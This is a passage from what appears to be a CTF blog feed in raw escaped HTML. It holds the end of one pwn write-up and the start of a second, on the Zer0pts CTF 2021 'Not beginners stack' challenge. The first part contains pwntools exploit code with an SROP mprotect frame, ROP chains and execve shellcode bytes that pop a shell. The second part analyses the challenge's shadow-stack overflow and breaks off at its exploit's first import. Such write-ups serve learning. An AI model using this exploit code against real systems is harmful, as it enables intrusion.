class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syscall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Perfect, let’s send the frame and then the 0xf bytes with the main address so we can return after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mprotect&lt;/code&gt;. I’m using 0x400000 because of what the manual says about mprotect:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The implementation may require that addr be a multiple of the page size as returned by sysconf()&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SigreturnFrame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mprotect syscall
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00400000&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# base address
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# size
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# permission RDX
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;900&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# where the main address will be
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syscall&lt;/span&gt;  

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;XXXXXX&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;We are adding a sleep of 2 seconds because now we can’t send the whole 0x100 bytes to fill the buffer. It is a dirty trick but it works.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now we are back in the main with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt; section writable. Let’s write a basic shellcode there to pop a shell. Same as before, ROP to write our input to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function and redirect to that address:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;first_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400570&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400570&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we got it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/flag-drop.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="htmlsummary></entry><entry><title type="html">Not beginners stack</title><link href="http://0.0.0.0:4000/2021/03/11/not-beginners-stack.html" rel="alternate" type="text/html" title="Not beginners stack" /><published>2021-03-11T00:00:00+01:00</published><updated>2021-03-11T00:00:00+01:00</updated><id>http://0.0.0.0:4000/2021/03/11/not-beginners-stack</id><content type="html" xml:base="http://0.0.0.0:4000/2021/03/11/not-beginners-stack.html">&lt;pre style=&quot;font-size: 0.5vw; text-align: center&quot;&gt; 
                                    WNKKKNW                                     
                                 WXxc&apos;...&apos;:d0NW                                 
                              W0d:..&apos;cxxdl,..&apos;cx0N                              
                           NOo;..,lOXW    WKkl,..,cxKW                          
                       WXkl&apos;..;o0N            NKxc,..,lkXW                      
                    WKxc&apos;..:xKW                   N0xc&apos;..;okXW                  
                 N0d;..&apos;lkXW                          N0dc&apos;..:oOXW              
              NOo,..,oON                                 WNOd:&apos;.&apos;:xX            
            Kl&apos;..;d0N                                        WXx&apos; .dW           
           Wo  &apos;xX                                         WKxc&apos;..c0            
            Ko;..,cxKN                                  W0d:..&apos;ckXW             
              WKkl,..,lxKW                           NOo,..,lON                 
                  W0l.  .,lkKW                   WXkl&apos;..  .:xKN                 
                N0d;..&apos;cl:&apos;..;okXW            WKxc...:dOOd:&apos;..,lxKW             
             NOo,..,lONW WXOo:...;oOXW     N0d;...cxKW    WXOo:...:0W           
           WO,..;d0N         WXOo;...;ok0ko,..,lOXW           Xx&apos; .dW           
           Wx. &apos;o0N              WXkl;.....;o0N           WXkl,..:xX            
            W0d:&apos;.,cx0N              WKOkOKW           WKx:..&apos;ckXW              
               WXOo:&apos;.,cxKN                         N0d;. .cON                  
                  W0l.  ..,lkKW                 WNOl,..,,..&apos;cd0N                
               N0o;..&apos;ckOxc&apos;..,lkKW          WKxc&apos;..:xKWWKxl,..,cx0N            
            WOl,..;oON     N0dc&apos;..;lkKW   WKd:..&apos;ckXW       NKxc. .oN           
           Wx. &apos;o0N           WNOd:&apos;..;lol;..,oON           WXOl..&apos;xW           
            0:..;oOXW             WXOo:&apos;.&apos;:d0N           WXxc&apos;.&apos;ckXW            
             WKxc,.&apos;:oOXW             WNNNW           WKd:..,oON                
                 N0xc,.&apos;:d0N                       N0o;..;d0N                   
                    WN0d:&apos;.&apos;cd0N               WXkl,.&apos;:xKW                      
                        WN0d:&apos;.,cx0N        WKxc&apos;.&apos;lkXW                         
                            WXOo:&apos;.,cxKNWN0d:..,oONW                            
                                WXOo;&apos;.,;,..;d0N                                
                                    WXOdookKW                                   

&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This was a really cool pwn challenge from the Zer0pts CTF 2021 rated with 81 points. The description said:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Elementary pwners love to overwrite the return address. This time you can’t!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;first-look&quot;&gt;First look&lt;/h2&gt;

&lt;p&gt;They gave us 3 files: the binary, a .S file and a markdown file.&lt;/p&gt;

&lt;p&gt;Let’s start with the markdown file:&lt;/p&gt;

&lt;p&gt;They told us that they are using their own stack to handle the return addresses of the calls so you can’t make a buffer overflow and redirect the execution. They implemented to macros for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%macro call 1
;; __stack_shadow[__stack_depth++] = return_address;
  mov ecx, [__stack_depth]
  mov qword [__stack_shadow + rcx * 8], %%return_address
  inc dword [__stack_depth]
;; goto function
  jmp %1
  %%return_address:
%endmacro

%macro ret 0
;; goto __stack_shadow[--__stack_depth];
  dec dword [__stack_depth]
  mov ecx, [__stack_depth]
  jmp qword [__stack_shadow + rcx * 8]
%endmacro
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So it looks like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_depth&lt;/code&gt; is storing how many inner calls have happened so it can put the return address correctly in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_shadow&lt;/code&gt;, which is where this stack really is.&lt;/p&gt;

&lt;p&gt;Okey, let’s take a look at the .S file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start
section .text

%macro call 1
;; __stack_shadow[__stack_depth++] = return_address;
  mov ecx, [__stack_depth]
  mov qword [__stack_shadow + rcx * 8], %%return_address
  inc dword [__stack_depth]
;; goto function
  jmp %1
  %%return_address:
%endmacro

%macro ret 0
;; goto __stack_shadow[--__stack_depth];
  dec dword [__stack_depth]
  mov ecx, [__stack_depth]
  jmp qword [__stack_shadow + rcx * 8]
%endmacro

_start:
  call notvuln
  call exit

notvuln:
;; char buf[0x100];
  enter 0x100, 0
;; vuln();
  call vuln
;; write(1, &quot;Data: &quot;, 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x100);
  mov edx, 0x100
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return 0;
  xor eax, eax
  ret

vuln:
;; char buf[0x100];
  enter 0x100, 0
;; write(1, &quot;Data: &quot;, 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x1000);
  mov edx, 0x1000               ; [!] vulnerability
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return;
  leave
  ret

read:
  xor eax, eax
  syscall
  ret

write:
  xor eax, eax
  inc eax
  syscall
  ret

exit:
  mov eax, 60
  syscall
  hlt
  
section .data
msg_data:
  db &quot;Data: &quot;
__stack_depth:
  dd 0

section .bss
__stack_shadow:
  resb 1024
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It is the assembly code from the binary and also the function C code in comments, let’s organize that:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;notvuln:&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Data: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Data: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can clearly see that the vuln function is expecting 0x100 bytes and reading 0x1000. Basic buffer overflow.&lt;/p&gt;

&lt;p&gt;We can also see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_depth&lt;/code&gt; is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt; section and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_shadow&lt;/code&gt; is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; section.&lt;/p&gt;

&lt;p&gt;Let’s look at the binary now:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/not-beginner-sec.png&quot; alt=&quot;Security&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okey so no protections at all. That looks cool.&lt;/p&gt;

&lt;h2 id=&quot;developing-the-attack&quot;&gt;Developing the attack&lt;/h2&gt;

&lt;p&gt;We know where to start. The vuln function is reading 0x1000 bytes and the array is 0x100 so there we can overflow BUT the return address is not in the usual stack, it is in the handcrafted one so the only thing we can do here is override the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If we check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;not-vuln&lt;/code&gt; function, we can see that the address where it puts the data we enter is referenced through the rbp:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we know that we can write 0x100 bytes wherever we want. As we saw in the beginning, we can check that the NX bit is not enabled so we can execute code in the stack.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/not-beginner-sections.png&quot; alt=&quot;Sections&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the goal is to put some shellcode in any place which is executable and redirect the execution there.&lt;/p&gt;

&lt;h2 id=&quot;putting-all-the-pieces-together&quot;&gt;Putting all the pieces together&lt;/h2&gt;

&lt;p&gt;The steps are:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Write shellcode&lt;/li&gt;
  &lt;li&gt;Redirect execution to shellcode.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We also know that:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We can write 0x100 bytes wherever we want&lt;/li&gt;
  &lt;li&gt;There aren’t any security mechanisms (no PIE, NX bit, canary, etc)&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;In order to redirect the execution, we have to change the return address in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_shadow&lt;/code&gt;, the handcrafted stack. We can start writing exactly where the return address of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notvuln&lt;/code&gt; function is.&lt;/p&gt;

&lt;p&gt;That means we could return exactly where we will put the shellcode, because we have 0x100 bytes to send.&lt;/p&gt;

&lt;p&gt;But we have a problem, as we saw before, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; is not executable and it has a length of 0x404, more that 0x100.&lt;/p&gt;

&lt;p&gt;We also know that we can write 0x1000 on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; function. So first, we can redirect the execution there and then, because we control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt;, we can override the return address to point it to the shellcode and also write the shellcode in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This looks promising!&lt;/p&gt;

&lt;h2 id=&quot;writing-the-exploit&quot;&gt;Writing the exploit&lt;/h2&gt;

&lt;p&gt;I used Python and Pwntools. First part, override the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt; variable with the buffer overflow so we write exactly where the return address is.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; starts at 0x00600234, which is where the handcrafted stack is. The read function will decrement the address by 0x100 so we have to add that to our address: 0x00600334. Finally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_depth&lt;/code&gt; value. In the vuln function, the main function only called the vuln one so the value would be 1.&lt;/p&gt;

&lt;p&gt;It multiplies the variable by 8 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov qword [__stack_shadow + rcx * 8], %%return_address&lt;/code&gt;) so we have to add 8 * 1 to the address and that will result in: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0060033c&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

